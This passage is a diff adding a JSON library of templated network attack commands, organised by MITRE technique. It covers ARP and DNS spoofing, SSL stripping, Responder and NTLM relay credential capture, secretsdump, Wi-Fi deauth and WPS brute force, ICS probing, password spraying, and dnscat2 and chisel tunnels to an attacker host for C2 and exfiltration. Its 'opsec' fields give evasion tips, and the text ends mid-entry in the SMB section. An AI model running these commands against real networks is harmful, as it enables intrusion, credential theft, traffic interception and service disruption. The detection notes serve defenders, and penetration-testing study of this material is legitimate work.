@@ -1,0 +1,1042 @@
+{
+  "network_recon": {
+    "description": "Internal network reconnaissance to map infrastructure, routing, and devices.",
+    "mitre": "T1046",
+    "commands": [
+      {
+        "description": "Live host discovery via ICMP ping sweep.",
+        "method": "nmap",
+        "command": "nmap -sn {subnet}/24 --min-rate 5000 -oG - | grep 'Up'"
+      },
+      {
+        "description": "ARP scan for live hosts (layer 2 — no ICMP needed).",
+        "method": "arp-scan",
+        "command": "arp-scan --localnet"
+      },
+      {
+        "description": "Service fingerprinting across discovered hosts.",
+        "method": "nmap",
+        "command": "nmap -sV -sC -T4 -iL live_hosts.txt -oA full_scan"
+      },
+      {
+        "description": "Identify network topology via traceroute.",
+        "method": "traceroute",
+        "command": "traceroute -T -p 443 {target}"
+      },
+      {
+        "description": "Discover SNMP-enabled devices.",
+        "method": "onesixtyone",
+        "command": "onesixtyone -c community_strings.txt {subnet}/24"
+      },
+      {
+        "description": "Enumerate SNMP community strings.",
+        "method": "snmpwalk",
+        "command": "snmpwalk -v2c -c {community} {target} 1.3.6.1.2.1"
+      }
+    ],
+    "prerequisites": "Network access; nmap or equivalent scanner; target IP range",
+    "opsec": "Full port scans generate significant IDS alerts. Use -sS (SYN) stealth scan, slow timing (-T2), fragmentation (-f). Target specific ports first.",
+    "detection_ref": "IDS signatures for port scanning; Suricata/Snort scan detection rules; anomalous connection rate from single source"
+  },
+  "arp_mitm": {
+    "description": "ARP spoofing and Man-in-the-Middle attacks on local networks.",
+    "mitre": "T1557.002",
+    "commands": [
+      {
+        "description": "ARP poison to intercept traffic between victim and gateway.",
+        "method": "arpspoof",
+        "command": "arpspoof -i {interface} -t {victim_ip} {gateway_ip} & arpspoof -i {interface} -t {gateway_ip} {victim_ip}"
+      },
+      {
+        "description": "Enable IP forwarding to avoid dropping intercepted traffic.",
+        "method": "shell",
+        "command": "echo 1 > /proc/sys/net/ipv4/ip_forward"
+      },
+      {
+        "description": "Full MITM with bettercap.",
+        "method": "bettercap",
+        "command": "bettercap -iface {interface} -eval \"net.probe on; arp.spoof on; net.sniff on\""
+      },
+      {
+        "description": "SSL strip to downgrade HTTPS to HTTP.",
+        "method": "bettercap",
+        "command": "bettercap -iface {interface} -eval \"net.probe on; arp.spoof on; https.proxy on; net.sniff on\""
+      },
+      {
+        "description": "Capture credentials from MITM position with Wireshark.",
+        "method": "tcpdump",
+        "command": "tcpdump -i {interface} -w capture.pcap 'host {victim_ip}'"
+      }
+    ],
+    "prerequisites": "Layer 2 access to same network segment; ARP spoofing tool (arpspoof, Bettercap)",
+    "opsec": "ARP spoofing is noisy — all hosts on segment detect it. Use targeted ARP poisoning (specific host pair). Enable IP forwarding to avoid dropping traffic.",
+    "detection_ref": "Dynamic ARP Inspection on managed switches; ARP cache anomaly monitoring; network-based IDS for gratuitous ARP floods"
+  },
+  "vlan_hopping": {
+    "description": "Bypassing VLAN segmentation via switch configuration abuse.",
+    "mitre": "T1599",
+    "commands": [
+      {
+        "description": "Double-tagging VLAN hop — send double 802.1Q tagged frame.",
+        "method": "scapy",
+        "command": "# sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan={target_vlan})/IP(dst={target})/TCP(), iface='{interface}')"
+      },
+      {
+        "description": "DTP trunk negotiation attack.",
+        "method": "yersinia",
+        "command": "yersinia dtp -attack 1"
+      },
+      {
+        "description": "Automated VLAN hopping with frogger.",
+        "method": "frogger",
+        "command": "python3 frogger.py -i {interface}"
+      },
+      {
+        "description": "Configure attacker interface to trunk mode for full VLAN access.",
+        "method": "shell",
+        "command": "modprobe 8021q && vconfig add {interface} {vlan_id} && ifconfig {interface}.{vlan_id} up"
+      }
+    ],
+    "prerequisites": "Switch port in auto-trunk mode; attacker can send 802.1Q frames; or access to native VLAN",
+    "opsec": "Double-tagging VLAN hopping is one-way (no return traffic without second hop). Switch spoofing requires trunk negotiation to succeed.",
+    "detection_ref": "Disable auto-trunking (switchport nonegotiate); native VLAN isolation; 802.1Q monitoring on access ports"
+  },
+  "dhcp_attacks": {
+    "description": "DHCP starvation and rogue server attacks.",
+    "mitre": "T1557",
+    "commands": [
+      {
+        "description": "DHCP starvation — exhaust IP pool with fake requests.",
+        "method": "yersinia",
+        "command": "yersinia dhcp -attack 1 -interface {interface}"
+      },
+      {
+        "description": "DHCP starvation with dhcpstarv.",
+        "method": "dhcpstarv",
+        "command": "dhcpstarv -i {interface}"
+      },
+      {
+        "description": "Set up rogue DHCP server to redirect traffic.",
+        "method": "metasploit",
+        "command": "use auxiliary/server/dhcp; set SRVHOST {lhost}; set ROUTER {gateway}; set DNSSERVER {lhost}; run"
+      },
+      {
+        "description": "Rogue DHCP with dnsmasq for DNS redirect.",
+        "method": "dnsmasq",
+        "command": "dnsmasq --interface={interface} --dhcp-range={start_ip},{end_ip} --dhcp-option=3,{lhost} --dhcp-option=6,{lhost}"
+      }
+    ],
+    "prerequisites": "Network access to DHCP broadcast domain; DHCP starvation or rogue server capability",
+    "opsec": "DHCP starvation (exhausting IP pool) is disruptive — avoid in production. Rogue DHCP is more targeted but still detectable via DHCP snooping.",
+    "detection_ref": "DHCP snooping on managed switches; rogue DHCP detection in network monitoring; DHCP server log anomalies"
+  },
+  "dns_attacks": {
+    "description": "DNS spoofing, poisoning, and amplification attacks.",
+    "mitre": "T1557.003",
+    "commands": [
+      {
+        "description": "DNS spoofing in MITM position with dnsspoof.",
+        "method": "dnsspoof",
+        "command": "dnsspoof -i {interface} -f hosts.txt"
+      },
+      {
+        "description": "DNS spoofing with bettercap.",
+        "method": "bettercap",
+        "command": "bettercap -eval \"dns.spoof.domains {target_domain}; dns.spoof on\""
+      },
+      {
+        "description": "Responder — capture NTLMv2 via LLMNR/NBT-NS/mDNS poisoning.",
+        "method": "Responder",
+        "command": "python3 Responder.py -I {interface} -wrf"
+      },
+      {
+        "description": "DNS zone transfer attempt.",
+        "method": "dig",
+        "command": "dig axfr @{dns_server} {domain}"
+      },
+      {
+        "description": "Subdomain takeover check.",
+        "method": "subjack",
+        "command": "subjack -w subdomains.txt -t 100 -o results.txt -ssl"
+      },
+      {
+        "description": "mDNS/Bonjour enumeration for local service discovery.",
+        "method": "avahi-browse",
+        "command": "avahi-browse --all --resolve --terminate 2>/dev/null | grep -E 'hostname|address|port'"
+      },
+      {
+        "description": "NBT-NS broadcast poisoning with Responder (captures NTLMv2).",
+        "method": "Responder",
+        "command": "python3 Responder.py -I {interface} -wrf -v  # Captures any NetBIOS name lookup on local segment"
+      }
+    ],
+    "prerequisites": "Access to DNS query path (MITM or DNS server access); or DNS cache poisoning vulnerability",
+    "opsec": "DNS cache poisoning requires timing precision. DNS hijacking via compromised resolver is more reliable. Use DNSSEC-aware detection evasion.",
+    "detection_ref": "DNSSEC validation; DNS response anomaly monitoring; split-horizon DNS; DNS query logging and analysis"
+  },
+  "snmp_exploitation": {
+    "description": "Exploiting SNMP misconfigurations for information disclosure and configuration changes.",
+    "mitre": "T1046",
+    "commands": [
+      {
+        "description": "Enumerate system info via SNMP v1/v2c.",
+        "method": "snmpwalk",
+        "command": "snmpwalk -v2c -c public {target} 1.3.6.1.2.1.1"
+      },
+      {
+        "description": "Enumerate all SNMP OIDs.",
+        "method": "snmpwalk",
+        "command": "snmpwalk -v2c -c {community} {target}"
+      },
+      {
+        "description": "Brute force SNMP community strings.",
+        "method": "onesixtyone",
+        "command": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target}"
+      },
+      {
+        "description": "SNMP v3 username enumeration.",
+        "method": "nmap",
+        "command": "nmap -sU -p 161 --script snmp-brute {target}"
+      },
+      {
+        "description": "Write community string abuse — change device config.",
+        "method": "snmpset",
+        "command": "snmpset -v2c -c {write_community} {target} {oid} s '{value}'"
+      }
+    ],
+    "prerequisites": "SNMP accessible on target; default community strings (public/private) or known community string",
+    "opsec": "SNMP v1/v2c community strings are unencrypted. snmpwalk generates many requests — use targeted OID queries. SNMPv3 requires auth bypass.",
+    "detection_ref": "Firewall blocking SNMP from unauthorized sources; SNMP access logging; migration to SNMPv3 with auth+encryption"
+  },
+  "bgp_routing_attacks": {
+    "description": "BGP route hijacking and manipulation attacks against internet routing infrastructure.",
+    "mitre": "T1557",
+    "commands": [
+      {
+        "description": "Enumerate BGP peers and ASN information.",
+        "method": "shell",
+        "command": "mrt2bgpdump /tmp/route-views.rib.bz2 | grep 'PREFIX:' | sort -u | head -100"
+      },
+      {
+        "description": "Check BGP route origin with RPKI validator.",
+        "method": "curl",
+        "command": "curl https://rpki-validator.ripe.net/api/v1/validity/{asn}/{prefix}"
+      },
+      {
+        "description": "Simulate BGP route announcement with ExaBGP.",
+        "method": "ExaBGP",
+        "command": "# exabgp.conf: neighbor {peer_ip} { router-id {our_ip}; local-address {our_ip}; local-as {our_asn}; peer-as {peer_asn}; static { route {prefix} next-hop {nh}; } }"
+      },
+      {
+        "description": "Monitor BGP routing changes with BGPmon.",
+        "method": "shell",
+        "command": "bgpmon --prefix {prefix} --asn {asn} --alert email:{alertemail}"
+      },
+      {
+        "description": "Use Routeviews to verify prefix origin and detect hijacks.",
+        "method": "telnet",
+        "command": "telnet route-views.routeviews.org && show ip bgp {prefix}"
+      }
+    ],
+    "prerequisites": "BGP session access (ISP relationship, compromised router, or route server access)",
+    "opsec": "BGP hijacking is highly visible on BGP monitoring services (BGPmon, RIPE). Test impact carefully — can cause widespread outages.",
+    "detection_ref": "BGP route monitoring services; RPKI validation; anomalous prefix announcement alerts; NOC monitoring"
+  },
+  "ipv6_attacks": {
+    "description": "IPv6-specific attacks including rogue router advertisements and DHCPv6 abuse.",
+    "mitre": "T1557",
+    "commands": [
+      {
+        "description": "Send rogue IPv6 Router Advertisement to redirect traffic.",
+        "method": "mitm6",
+        "command": "mitm6 -i {interface} -d {domain}"
+      },
+      {
+        "description": "Combined IPv6 RA + DHCPv6 MITM with ntlmrelayx.",
+        "method": "mitm6",
+        "command": "mitm6 -i {interface} -d {domain} & ntlmrelayx.py -6 -t ldaps://{dc_ip} -wh {attacker_ip} -l loot/"
+      },
+      {
+        "description": "Enumerate IPv6 link-local addresses on the network.",
+        "method": "nmap",
+        "command": "nmap -6 -sn ff02::1%{interface}"
+      },
+      {
+        "description": "Scan IPv6 network segment.",
+        "method": "nmap",
+        "command": "nmap -6 -sV {ipv6_prefix}::/64"
+      },
+      {
+        "description": "Send ICMPv6 Neighbor Solicitation for target discovery.",
+        "method": "scapy",
+        "command": "# from scapy.all import *; sendp(Ether(dst='33:33:ff:00:00:01')/IPv6(dst='ff02::1:ff00:1')/ICMPv6ND_NS(tgt='{target_ipv6}'), iface='{interface}')"
+      }
+    ],
+    "prerequisites": "IPv6 enabled but not managed (common in Windows networks); mitm6 or similar",
+    "opsec": "mitm6 sends ICMPv6 router advertisements — detectable. Target Windows clients preferring IPv6 by default. Works even when IPv6 is 'disabled' on network.",
+    "detection_ref": "DHCPv6 snooping; RA Guard on switches; monitoring for rogue IPv6 router advertisements; disable IPv6 if unused"
+  },
+  "traffic_interception": {
+    "description": "Passively and actively intercepting network traffic for credential and data capture.",
+    "mitre": "T1040",
+    "commands": [
+      {
+        "description": "Capture all traffic on interface with tcpdump — full packet content.",
+        "method": "tcpdump",
+        "command": "tcpdump -i {interface} -s 0 -w /tmp/full_capture.pcap"
+      },
+      {
+        "description": "Extract HTTP credentials from pcap with Wireshark tshark.",
+        "method": "tshark",
+        "command": "tshark -r capture.pcap -Y 'http.request.method==POST' -T fields -e http.file_data | grep -i 'password\\|pass\\|pwd'"
+      },
+      {
+        "description": "Extract NTLM hashes from pcap with PCredz.",
+        "method": "PCredz",
+        "command": "python3 PCredz -f capture.pcap"
+      },
+      {
+        "description": "Real-time credential extraction from interface.",
+        "method": "PCredz",
+        "command": "python3 PCredz -i {interface}"
+      },
+      {
+        "description": "Intercept and decode FTP/Telnet/HTTP with ngrep.",
+        "method": "ngrep",
+        "command": "ngrep -W byline -d {interface} 'pass\\|user\\|login' tcp port 21 or tcp port 23 or tcp port 80"
+      }
+    ],
+    "prerequisites": "Network tap, SPAN port, or MITM position; packet capture capability",
+    "opsec": "Passive sniffing leaves no network trace. SPAN port configuration requires switch access. Active MITM generates detectable traffic.",
+    "detection_ref": "Promiscuous mode detection on hosts; network tap audit; switch SPAN port authorization controls; encrypted traffic enforcement"
+  },
+  "wifi_attacks": {
+    "description": "Comprehensive wireless attack techniques from low-level reconnaissance to advanced enterprise exploitation and post-compromise operations.",
+    "mitre": "T1465",
+    "commands": [
+      {
+        "description": "Enable monitor mode on wireless interface.",
+        "method": "airmon-ng",
+        "command": "airmon-ng start {interface}"
+      },
+      {
+        "description": "Passive reconnaissance — identify nearby access points and clients.",
+        "method": "airodump-ng",
+        "command": "airodump-ng {interface}mon"
+      },
+      {
+        "description": "Targeted BSSID monitoring on specific channel.",
+        "method": "airodump-ng",
+        "command": "airodump-ng -c {channel} --bssid {bssid} -w capture {interface}mon"
+      },
+      {
+        "description": "Deauthentication attack — force client to reconnect and capture handshake.",
+        "method": "aireplay-ng",
+        "command": "aireplay-ng --deauth 10 -a {bssid} -c {client_mac} {interface}mon"
+      },
+      {
+        "description": "Capture WPA2 4-way handshake.",
+        "method": "airodump-ng",
+        "command": "airodump-ng -c {channel} --bssid {bssid} -w handshake {interface}mon"
+      },
+      {
+        "description": "Offline WPA/WPA2-PSK cracking.",
+        "method": "aircrack-ng",
+        "command": "aircrack-ng handshake.cap -w {wordlist}"
+      },
+      {
+        "description": "Capture PMKID without client interaction.",
+        "method": "hcxdumptool",
+        "command": "hcxdumptool -i {interface}mon -o dump.pcapng --active_beacon --enable_status=15"
+      },
+      {
+        "description": "Convert capture to hashcat format and perform GPU cracking.",
+        "method": "hashcat",
+        "command": "hcxpcapngtool -o hash.22000 dump.pcapng && hashcat -m 22000 hash.22000 {wordlist}"
+      },
+      {
+        "description": "WPS PIN brute-force attack.",
+        "method": "reaver",
+        "command": "reaver -i {interface}mon -b {bssid} -vv"
+      },
+      {
+        "description": "Pixie Dust attack against vulnerable WPS implementations.",
+        "method": "reaver",
+        "command": "reaver -i {interface}mon -b {bssid} -K"
+      },
+      {
+        "description": "Evil Twin attack — clone legitimate SSID to capture credentials.",
+        "method": "airbase-ng",
+        "command": "airbase-ng -e \"{ssid}\" -c {channel} {interface}mon"
+      },
+      {
+        "description": "Captive portal credential harvesting.",
+        "method": "WiFi Pineapple",
+        "command": "# Deploy captive portal module and clone target login page"
+      },
+      {
+        "description": "Karma attack — respond to all probe requests.",
+        "method": "WiFi Pineapple",
+        "command": "# Enable PineAP/Karma mode to respond to any broadcasted SSID"
+      },
+      {
+        "description": "WPA3 downgrade attack — force client fallback to WPA2.",
+        "method": "hostapd-wpe",
+        "command": "# Configure hostapd with rsn_override_mfp=0 to disable WPA3 and force WPA2"
+      },
+      {
+        "description": "WPA3 SAE handshake capture for offline attack (if weak password).",
+        "method": "hcxdumptool",
+        "command": "hcxdumptool -i {interface}mon -o wpa3_capture.pcapng"
+      },
+      {
+        "description": "Enterprise WPA2 (EAP-MSCHAPv2) credential harvesting.",
+        "method": "hostapd-wpe",
+        "command": "# Configure rogue AP matching target SSID to capture MSCHAPv2 challenge/response"
+      },
+      {
+        "description": "Crack captured MSCHAPv2 challenge/response.",
+        "method": "asleap",
+        "command": "asleap -C {challenge} -R {response} -W {wordlist}"
+      },
+      {
+        "description": "802.11 disassociation flood — denial of service.",
+        "method": "mdk4",
+        "command": "mdk4 {interface}mon d -B {bssid}"
+      },
+      {
+        "description": "Beacon flood — overwhelm clients with fake APs.",
+        "method": "mdk4",
+        "command": "mdk4 {interface}mon b -f ssid_list.txt"
+      },
+      {
+        "description": "Hidden SSID reveal via active probing.",
+        "method": "airodump-ng",
+        "command": "airodump-ng --ivs {interface}mon"
+      },
+      {
+        "description": "Rogue AP with DNS spoofing for traffic interception.",
+        "method": "bettercap",
+        "command": "bettercap -iface {interface} -eval \"set dns.spoof.domains *; dns.spoof on\""
+      },
+      {
+        "description": "Man-in-the-Middle attack after rogue AP association.",
+        "method": "ettercap",
+        "command": "ettercap -T -q -i {interface} -M arp:remote"
+      },
+      {
+        "description": "KRACK attack simulation (lab only) — exploit WPA2 key reinstallation vulnerability.",
+        "method": "krackattack",
+        "command": "# Launch KRACK test scripts against vulnerable client in controlled lab"
+      },
+      {
+        "description": "Client MAC address tracking and profiling.",
+        "method": "airodump-ng",
+        "command": "airodump-ng --manufacturer {interface}mon"
+      },
+      {
+        "description": "Post-compromise lateral movement from compromised WiFi client.",
+        "method": "nmap",
+        "command": "nmap -sC -sV {local_subnet}"
+      }
+    ],
+    "prerequisites": "Wireless adapter with monitor mode; target SSID in range; for WPA attacks: captured handshake",
+    "opsec": "Evil twin attacks require deauth — this is illegal in many jurisdictions and highly noisy. Use passive monitoring first. PMKID attacks require no deauth.",
+    "detection_ref": "Wireless intrusion detection systems (WIDS); deauth flood detection; rogue AP detection; 802.11w management frame protection"
+  },
+  "industrial_ot_attacks": {
+    "description": "Scanning and attacking Industrial Control Systems and OT networks.",
+    "mitre": "T1046",
+    "commands": [
+      {
+        "description": "Discover industrial devices with Nmap ICS scripts.",
+        "method": "nmap",
+        "command": "nmap --script=modbus-discover,s7-info,dnp3-info,enip-info -p 102,502,20000,44818 {target_range}"
+      },
+      {
+        "description": "Enumerate Modbus registers.",
+        "method": "mbtget",
+        "command": "mbtget -r 1 -c 100 {target}"
+      },
+      {
+        "description": "Query Siemens S7 PLC info.",
+        "method": "python-snap7",
+        "command": "python3 -c \"import snap7; client=snap7.client.Client(); client.connect('{target}',0,2); print(client.get_cpu_info())\""
+      },
+      {
+        "description": "Enumerate SCADA/HMI via Shodan.",
+        "method": "shodan",
+        "command": "shodan search 'port:102 Siemens' OR 'port:502 Modbus' --fields ip_str,port,org,os"
+      },
+      {
+        "description": "ICS vulnerability scan with Redpoint Nmap scripts.",
+        "method": "nmap",
+        "command": "nmap --script=iec-identify,dnp3-info,modbus-discover -sU -sT -pT:102,502,44818,20000,2404 {target}"
+      }
+    ],
+    "prerequisites": "Access to OT network (air-gapped or connected ICS/SCADA); protocol knowledge (Modbus, DNP3, IEC 61850)",
+    "opsec": "OT networks are extremely sensitive — any disruption can cause physical damage or safety incidents. Passive reconnaissance only unless explicitly authorized.",
+    "detection_ref": "OT-specific IDS (Dragos, Claroty, Nozomi); protocol anomaly detection; asset inventory monitoring; segmentation enforcement"
+  },
+  "network_tunneling": {
+    "description": "Advanced tunneling and covert channel techniques for C2 and data exfiltration.",
+    "mitre": "T1572",
+    "commands": [
+      {
+        "description": "DNS tunneling C2 with dnscat2.",
+        "method": "dnscat2",
+        "command": "# Server: ruby dnscat2.rb {your_domain}\\n# Client: ./dnscat --dns=server={attacker_ip},port=53 {your_domain}"
+      },
+      {
+        "description": "ICMP tunneling with ptunnel-ng.",
+        "method": "ptunnel-ng",
+        "command": "# Server: ptunnel-ng -r{server_ip} -R22\\n# Client: ptunnel-ng -p{server_ip} -l2222 -r127.0.0.1 -R22 && ssh -p2222 {user}@localhost"
+      },
+      {
+        "description": "HTTP/S tunneling via chisel for firewall egress.",
+        "method": "chisel",
+        "command": "# Attacker: chisel server -p 8080 --reverse\\n# Target: chisel client {attacker}:8080 R:socks"
+      },
+      {
+        "description": "Port knocking sequence to open firewall rule.",
+        "method": "shell",
+        "command": "for port in {knock_seq}; do nmap -Pn --host-timeout 201ms --max-retries 0 -p $port {target} 2>/dev/null; done && ssh {user}@{target}"
+      },
+      {
+        "description": "Proxy via HTTP CONNECT through web proxy.",
+        "method": "proxychains",
+        "command": "echo 'http {proxy_ip} {proxy_port}' >> /etc/proxychains.conf && proxychains nmap -sT -Pn {internal_target}"
+      }
+    ],
+    "prerequisites": "Outbound connectivity on allowed protocol (DNS, ICMP, HTTP); tunnel tool on both ends",
+    "opsec": "DNS tunneling has high query volume and unusual TTLs — detectable. ICMP tunneling via ping is stealthy in permissive environments. HTTP tunneling over port 80/443 blends best.",
+    "detection_ref": "DNS query rate and entropy anomalies; ICMP payload inspection; HTTP proxy logging for tunneling patterns; DPI appliances"
+  },
+  "ntlm_relay_attacks": {
+    "description": "NTLM relay attacks — capture authentication attempts and relay them to SMB, LDAP, or MSSQL targets to gain access without cracking hashes.",
+    "mitre": "T1557.001",
+    "commands": [
+      {
+        "description": "Identify SMB signing disabled hosts (relay targets)",
+        "command": "crackmapexec smb 192.168.1.0/24 --gen-relay-list /tmp/relay_targets.txt\nnmap -p445 --script smb-security-mode 192.168.1.0/24 | grep 'message_signing: disabled'",
+        "method": "CrackMapExec/nmap"
+      },
+      {
+        "description": "Start ntlmrelayx targeting SMB on relay targets",
+        "command": "impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support -c 'whoami > C:\\Temp\\pwned.txt'",
+        "method": "Impacket"
+      },
+      {
+        "description": "Start ntlmrelayx with SOCKS for interactive sessions",
+        "command": "impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support -socks\n# Then: proxychains impacket-secretsdump -no-pass domain/user@192.168.1.10",
+        "method": "Impacket/SOCKS"
+      },
+      {
+        "description": "Relay to LDAP to dump AD information or add user to group",
+        "command": "impacket-ntlmrelayx -t ldap://192.168.1.10 --no-smb-server --no-http-server -smb2support --escalate-user lowpriv",
+        "method": "Impacket/LDAP"
+      },
+      {
+        "description": "Trigger NTLM auth from targets using Responder + PrinterBug",
+        "command": "python3 Responder.py -I eth0 -r -d -P\n# Trigger: python3 printerbug.py domain/user:pass@target.com attacker-ip",
+        "method": "Responder/PrinterBug"
+      }
+    ],
+    "prerequisites": "Ability to capture NTLM authentication (LLMNR poisoning, MITM); target with SMB signing disabled",
+    "opsec": "Responder+ntlmrelayx is noisy — generates many multicast responses. Use --lm flag to downgrade auth. Target specific high-value systems for relay.",
+    "detection_ref": "SMB signing enforcement; LLMNR/NBT-NS disabled via GPO; network IDS for relay patterns; Event 4624 Type 3 from unexpected sources"
+  },
+  "llmnr_nbt_poisoning": {
+    "description": "Poison LLMNR, NBT-NS, and mDNS broadcast queries to capture NTLMv1/v2 hashes for offline cracking or relay attacks.",
+    "mitre": "T1557.001",
+    "commands": [
+      {
+        "description": "Start Responder to poison all broadcast protocols",
+        "command": "python3 Responder.py -I eth0 -wrf\n# -w WPAD rogue proxy, -r NBT-NS workstation requests, -f fingerprint OS",
+        "method": "Responder"
+      },
+      {
+        "description": "Run Responder in analysis mode (passive — no spoofing)",
+        "command": "python3 Responder.py -I eth0 -A\n# Identifies hosts sending LLMNR/NBT-NS queries without responding",
+        "method": "Responder"
+      },
+      {
+        "description": "IPv6 DNS takeover with mitm6 (captures AD credentials)",
+        "command": "python3 mitm6.py -d domain.local\n# Combine with ntlmrelayx:\nimpacket-ntlmrelayx -6 -t ldaps://192.168.1.10 --delegate-access --no-smb-server",
+        "method": "mitm6/Impacket"
+      },
+      {
+        "description": "Windows Inveigh for poisoning from compromised Windows host",
+        "command": "Import-Module Inveigh.ps1\nInvoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -SMB Y",
+        "method": "Inveigh/PowerShell"
+      },
+      {
+        "description": "Crack captured NTLMv2 hashes with hashcat",
+        "command": "hashcat -m 5600 /tmp/ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt --force\nhashcat -m 5600 /tmp/ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+        "method": "hashcat"
+      }
+    ],
+    "prerequisites": "Same network segment as targets; LLMNR/NBT-NS enabled on Windows (default); Responder or similar",
+    "opsec": "Responder captures hashes passively. Only respond to queries for non-existent hosts to avoid disruption. Log all captured hashes immediately.",
+    "detection_ref": "Disable LLMNR/NBT-NS via GPO; Event 4625 spike from Responder; network monitoring for LLMNR traffic; MDNS anomaly detection"
+  },
+  "nmap_reference": {
+    "description": "Nmap scan options and flags reference for network enumeration.",
+    "mitre": "T1046",
+    "commands": [
+      {
+        "description": "Disable port scanning (ping sweep only).",
+        "method": "nmap",
+        "command": "nmap -sn {subnet}/24"
+      },
+      {
+        "description": "Disable ICMP echo requests.",
+        "method": "nmap",
+        "command": "nmap -Pn {target}"
+      },
+      {
+        "description": "Disable DNS resolution.",
+        "method": "nmap",
+        "command": "nmap -n {target}"
+      },
+      {
+        "description": "Ping scan using ICMP Echo Requests.",
+        "method": "nmap",
+        "command": "nmap -PE {target}"
+      },
+      {
+        "description": "Show all packets sent and received.",
+        "method": "nmap",
+        "command": "nmap --packet-trace {target}"
+      },
+      {
+        "description": "Scan top N most common ports.",
+        "method": "nmap",
+        "command": "nmap --top-ports={num} {target}"
+      },
+      {
+        "description": "Scan all 65535 ports.",
+        "method": "nmap",
+        "command": "nmap -p- {target}"
+      },
+      {
+        "description": "Scan top 100 ports fast.",
+        "method": "nmap",
+        "command": "nmap -F {target}"
+      },
+      {
+        "description": "TCP SYN scan (stealth).",
+        "method": "nmap",
+        "command": "nmap -sS {target}"
+      },
+      {
+        "description": "TCP ACK scan (firewall rule testing).",
+        "method": "nmap",
+        "command": "nmap -sA {target}"
+      },
+      {
+        "description": "UDP scan.",
+        "method": "nmap",
+        "command": "nmap -sU {target}"
+      },
+      {
+        "description": "Version detection scan.",
+        "method": "nmap",
+        "command": "nmap -sV {target}"
+      },
+      {
+        "description": "Default scripts scan.",
+        "method": "nmap",
+        "command": "nmap -sC {target}"
+      },
+      {
+        "description": "OS detection scan.",
+        "method": "nmap",
+        "command": "nmap -O {target}"
+      },
+      {
+        "description": "Aggressive scan (OS + version + scripts + traceroute).",
+        "method": "nmap",
+        "command": "nmap -A {target}"
+      },
+      {
+        "description": "Decoy scan to obfuscate attacker IP.",
+        "method": "nmap",
+        "command": "nmap -D RND:5 {target}"
+      },
+      {
+        "description": "Specify source IP for scan.",
+        "method": "nmap",
+        "command": "nmap -S {source_ip} {target}"
+      },
+      {
+        "description": "Use specific DNS server for resolution.",
+        "method": "nmap",
+        "command": "nmap --dns-server {ns} {target}"
+      },
+      {
+        "description": "Save results in all formats.",
+        "method": "nmap",
+        "command": "nmap -oA {filename} {target}"
+      },
+      {
+        "description": "Save results in grepable format.",
+        "method": "nmap",
+        "command": "nmap -oG {filename} {target}"
+      },
+      {
+        "description": "Set maximum retries for port scans.",
+        "method": "nmap",
+        "command": "nmap --max-retries 3 {target}"
+      },
+      {
+        "description": "Set minimum packet rate.",
+        "method": "nmap",
+        "command": "nmap --min-rate 300 {target}"
+      },
+      {
+        "description": "Ping sweep with fping.",
+        "method": "fping",
+        "command": "fping -asgq {subnet}/24"
+      }
+    ],
+    "prerequisites": "nmap installed; network access to target range",
+    "opsec": "Aggressive scans (-A, -T4) generate IDS alerts. Use -T2 slow timing for stealth. SYN scan (-sS) is quieter than connect scan (-sT).",
+    "detection_ref": "IDS for port scan patterns; anomalous connection rate; Suricata/Snort scan detection rules"
+  },
+  "attacking_ftp": {
+    "description": "Attacking FTP services — anonymous access, credential brute force, and file operations.",
+    "mitre": "T1110.003",
+    "commands": [
+      {
+        "description": "Connect to FTP service with ftp client.",
+        "method": "ftp",
+        "command": "ftp {target}"
+      },
+      {
+        "description": "Connect to FTP with netcat for banner grab.",
+        "method": "nc",
+        "command": "nc -v {target} 21"
+      },
+      {
+        "description": "Connect to FTP with telnet.",
+        "method": "telnet",
+        "command": "telnet {target} 21"
+      },
+      {
+        "description": "Connect to FTP with encrypted connection (FTPS).",
+        "method": "openssl",
+        "command": "openssl s_client -connect {target}:21 -starttls ftp"
+      },
+      {
+        "description": "Download all available files from FTP anonymously.",
+        "method": "wget",
+        "command": "wget -m --no-passive ftp://anonymous:anonymous@{target}"
+      },
+      {
+        "description": "Brute-force FTP credentials with Hydra.",
+        "method": "Hydra",
+        "command": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ftp://{target}"
+      }
+    ],
+    "prerequisites": "Network access to FTP port 21; target running FTP service",
+    "opsec": "Anonymous FTP access is common on misconfigured servers. Brute force generates multiple failed login events.",
+    "detection_ref": "FTP audit logging; failed login threshold alerts; anomalous download volume from FTP; anonymous FTP access monitoring"
+  },
+  "attacking_smb": {
+    "description": "Attacking SMB services — null sessions, share enumeration, relay attacks, and credential abuse.",
+    "mitre": "T1021.002",
+    "commands": [
+      {
+        "description": "SMB null session listing.",
+        "method": "smbclient",
+        "command": "smbclient -N -L //{target}"
+      },
+      {
+        "description": "Connect to specific SMB share.",
+        "method": "smbclient",
+        "command": "smbclient //{target}/{share}"
+      },
+      {
+        "description": "Enumerate SMB shares with smbmap.",
+        "method": "smbmap",
+        "command": "smbmap -H {target}"
+      },
+      {
+        "description": "Recursive SMB share enumeration.",
+        "method": "smbmap",
+        "command": "smbmap -H {target} -r {share_name}"
+      },
+      {
+        "description": "Download file from SMB share.",
+        "method": "smbmap",
+        "command": "smbmap -H {target} --download '{share}\\{filename}'"
+      },
+      {
+        "description": "Upload file to SMB share.",
+        "method": "smbmap",
+        "command": "smbmap -H {target} --upload test.txt '{share}\\test.txt'"
+      },
+      {
+        "description": "SMB null session with rpcclient.",
+        "method": "rpcclient",
+        "command": "rpcclient -U'%' {target}"
+      },
+      {
+        "description": "Automated SMB enumeration.",
+        "method": "enum4linux-ng",
+        "command": "./enum4linux-ng.py {target} -A -C"
+      },
+      {
+        "description": "Password spraying against SMB.",
+        "method": "crackmapexec",
+        "command": "crackmapexec smb {target} -u /tmp/userlist.txt -p '{password}'"
+      },
+      {
+        "description": "Connect to SMB with impacket-psexec.",
+        "method": "Impacket",
+        "command": "impacket-psexec {user}:'{pass}'@{target}"
+      },
+      {
+        "description": "Execute command over SMB with CrackMapExec.",
+        "method": "crackmapexec",
+        "command": "crackmapexec smb {target} -u {user} -p '{pass}' -x 'whoami' --exec-method smbexec"
+      },
+      {
